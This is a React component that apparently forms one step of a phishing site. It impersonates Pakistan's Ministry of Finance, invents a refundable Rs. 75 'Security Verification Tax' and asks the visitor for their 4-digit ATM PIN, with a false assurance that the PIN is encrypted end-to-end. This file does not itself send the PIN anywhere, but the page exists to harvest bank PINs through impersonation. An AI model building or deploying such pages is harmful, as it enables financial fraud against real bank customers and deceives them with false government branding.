import React, { useState, useRef } from 'react';
import { Language } from '../../types';
import { ShieldCheck, ArrowRight, ArrowLeft } from 'lucide-react';

interface Step8PinProps {
  language: Language;
  onNext: () => void;
  onBack: () => void;
}

export const Step8Pin: React.FC<Step8PinProps> = ({
  language,
  onNext,
  onBack,
}) => {
  const [pin, setPin] = useState<string[]>(['', '', '', '']);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const handleChange = (index: number, value: string) => {
    const clean = value.replace(/\D/g, '').slice(-1);
    const newPin = [...pin];
    newPin[index] = clean;
    setPin(newPin);

    if (clean && index < 3) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !pin[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const isComplete = pin.every((d) => d !== '');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (isComplete) {
      onNext();
    }
  };

  return (
    <div className="max-w-xl mx-auto px-4 py-6 animate-in fade-in duration-300">
      <div className="bg-white rounded-3xl shadow-xl border border-emerald-100 p-6 md:p-8 space-y-6">
        {/* Header */}
        <div>
          <div className="text-[10px] uppercase font-bold text-emerald-800 tracking-wider mb-1">
            GOVERNMENT OF PAKISTAN • MINISTRY OF FINANCE
          </div>
          <h2 className="text-2xl font-black text-gray-900 tracking-tight flex items-center justify-between">
            <span>{language === 'en' ? 'ATM PIN Verification' : 'اے ٹی ایم پن تصدیق'}</span>
            <span className="text-xs font-semibold text-emerald-700 bg-emerald-50 px-3 py-1 rounded-full border border-emerald-200">
              Step 5 of 5
            </span>
          </h2>
        </div>

        {/* Security verification tax notice */}
        <div className="bg-emerald-50/80 border border-emerald-200 rounded-2xl p-4 flex items-start gap-3">
          <ShieldCheck className="w-5 h-5 text-emerald-700 shrink-0 mt-0.5" />
          <div className="space-y-1">
            <div className="font-bold text-xs text-emerald-900">
              {language === 'en'
                ? 'Security Verification Tax: Rs. 75'
                : 'اے ٹی ایم پن تصدیق: سکیورٹی تصدیق ٹیکس Rs. 75'}
            </div>
            <p className="text-xs text-emerald-800/80">
              {language === 'en'
                ? 'For your account security, a one-time refundable tax of Rs. 75 will be charged. Please enter your 4-digit ATM PIN to authorize this verification.'
                : 'آپ کے اکاؤنٹ کی حفاظت کے لیے 75 روپے کا قابل واپسی ٹیکس وصول کیا جائے گا۔ تصدیق کے لیے اپنا 4 ہندسوں کا اے ٹی ایم پن درج کریں۔'}
            </p>
          </div>
        </div>

        {/* Target debit card badge */}
        <div className="bg-gradient-to-r from-[#072516] to-[#0D3825] rounded-2xl p-4 text-white flex justify-between items-center shadow-md">
          <div className="space-y-0.5">
            <span className="text-[10px] text-emerald-300 uppercase font-bold">Target Debit Card</span>
            <div className="font-mono text-sm tracking-widest">XXXX XXXX XXXX 3289</div>
          </div>
          <span className="bg-emerald-500 text-gray-950 font-bold text-xs px-3 py-1 rounded-lg">
            PREMIUM DEBIT
          </span>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="text-center space-y-2">
            <label className="text-sm font-bold text-gray-800 block">
              {language === 'en' ? 'Enter 4-digit ATM PIN' : '(ہندسوں کا پن درج کریں 4)'}
            </label>

            {/* 4 PIN boxes */}
            <div className="flex justify-center gap-3 md:gap-4 py-2">
              {pin.map((digit, idx) => (
                <input
                  key={idx}
                  ref={(el) => {
                    inputRefs.current[idx] = el;
                  }}
                  type="password"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleChange(idx, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(idx, e)}
                  className="w-12 h-16 md:w-14 md:h-20 text-center text-2xl md:text-3xl font-black bg-gray-50 border-2 border-gray-300 rounded-2xl focus:border-emerald-700 focus:bg-white focus:outline-none shadow-xs font-mono"
                />
              ))}
            </div>
          </div>

          <p className="text-[11px] text-gray-500 text-center">
            {language === 'en'
              ? 'Your ATM PIN is encrypted end-to-end and used only for one-time security verification.'
              : 'آپ کا پن مکمل طور پر محفوظ ہے اور صرف ایک بار تصدیق کے لیے استعمال ہوگا۔'}
          </p>

          {/* Status Indicator */}
          <div className={`p-4 rounded-2xl border flex items-center justify-between text-xs font-semibold ${
            isComplete ? 'bg-emerald-50 border-emerald-200 text-emerald-900' : 'bg-amber-50 border-amber-200 text-amber-800'
          }`}>
            <span>
              {isComplete ? '4-digit ATM PIN entered' : 'Enter complete 4-digit ATM PIN to proceed'}
            </span>
            <span className={isComplete ? 'text-emerald-700 font-bold' : 'text-amber-700 font-mono'}>
              {pin.filter(Boolean).length} / 4
            </span>
          </div>

          {/* Buttons */}
          <div className="flex gap-3 pt-2">
            <button
              type="button"
              onClick={onBack}
              className="px-6 py-3 bg-gray-100 hover:bg-gray-200 text-gray-700 font-bold rounded-xl text-sm transition cursor-pointer flex items-center gap-2"
            >
              <ArrowLeft className="w-4 h-4" />
              <span>{language === 'en' ? 'Back' : 'واپس'}</span>
            </button>
            <button
              type="submit"
              disabled={!isComplete}
              className={`flex-1 py-3.5 rounded-xl font-bold text-sm shadow-md flex items-center justify-center gap-2 transition ${
                isComplete
                  ? 'bg-[#092217] hover:bg-[#0D3825] text-white cursor-pointer'
                  : 'bg-gray-200 text-gray-400 cursor-not-allowed'
              }`}
            >
              <span>{language === 'en' ? 'Authorize & Submit' : 'جمع کروائیں'}</span>
              <ArrowRight className="w-4 h-4" />
            </button>
          </div>
        </form>
      </div>
    </div>
  );
};
